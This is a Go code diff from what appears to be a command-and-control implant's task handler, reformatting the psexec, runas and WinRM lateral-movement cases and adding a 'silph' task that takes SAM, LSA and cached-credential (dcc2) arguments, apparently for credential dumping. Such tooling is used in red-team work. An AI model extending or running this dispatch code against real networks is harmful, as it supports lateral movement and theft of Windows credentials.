@@ -330,9 +330,9 @@ func HandleTask(t utils.Task) ([]byte, error) {
 			"servicename": serviceName,
 			"servicedesc": serviceDesc,
 			"binpath":     binPath,
-			"hostname":  hostname,
-			"filedata":  t.Reqdata,
-			"args":  args,
+			"hostname":    hostname,
+			"filedata":    t.Reqdata,
+			"args":        args,
 		}
 		resp, err := RegisterTaskInModule("psexec", data)
 		return resp, err
@@ -349,9 +349,9 @@ func HandleTask(t utils.Task) ([]byte, error) {
 		utils.Print("Argument Are for runas %s %s %s %s", taskAction, script)
 
 		data := map[string]interface{}{
-			"taskid":      t.TaskId,
-			"taskaction":  taskAction,
-			"script":  script,
+			"taskid":     t.TaskId,
+			"taskaction": taskAction,
+			"script":     script,
 		}
 		resp, err := RegisterTaskInModule("powercliff", data)
 		return resp, err
@@ -374,19 +374,37 @@ func HandleTask(t utils.Task) ([]byte, error) {
 		authType = commandArgs[4]
 		background = commandArgs[5]
 
-
 		data := map[string]interface{}{
-			"taskid":      t.TaskId,
-			"host":  host,
-			"port":  port,
-			"insecure": insecure,
-			"tls": tls,
-			"authType": authType,
-			"background": background,
+			"taskid":           t.TaskId,
+			"host":             host,
+			"port":             port,
+			"insecure":         insecure,
+			"tls":              tls,
+			"authType":         authType,
+			"background":       background,
 			"winrmPackedParam": t.Reqdata,
 		}
 		resp, err := RegisterTaskInModule("winrm", data)
 		return resp, err
+	case "silph":
+		commandArgs, size := ParseCommandLineArgument(res[1])
+		if size != 3 {
+			return []byte("Error in number argument for silph"), fmt.Errorf("Error in number of args for silph")
+		}
+		sam := commandArgs[0]
+		lsa := commandArgs[1]
+		dcc2 := commandArgs[2]
+
+		data := map[string]interface{}{
+			"taskid":           t.TaskId,
+			"sam":             sam,
+			"lsa":             lsa,
+			"dcc2":         dcc2,
+		}
+		resp, err := RegisterTaskInModule("silph", data)
+		return resp, err
+
+
 	case "upload":
 		stdoutbyte, stderrbyte, err := upload.Upload(res[1], t.Reqdata)
 		resp := ConstructResponse(stdoutbyte, stderrbyte, err)
